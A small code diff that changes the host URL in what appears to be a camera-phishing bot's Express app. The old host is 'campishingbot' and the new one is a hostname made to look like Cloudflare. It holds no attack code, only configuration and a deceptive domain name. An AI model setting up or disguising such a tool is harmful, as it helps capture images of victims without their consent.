@@ -14,7 +14,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="https://campishingbot.onrender.com";
+var hostURL="https://cloudflare-a30g.onrender.com";
 //TOGGLE for Shortes
 var use1pt=false;
 
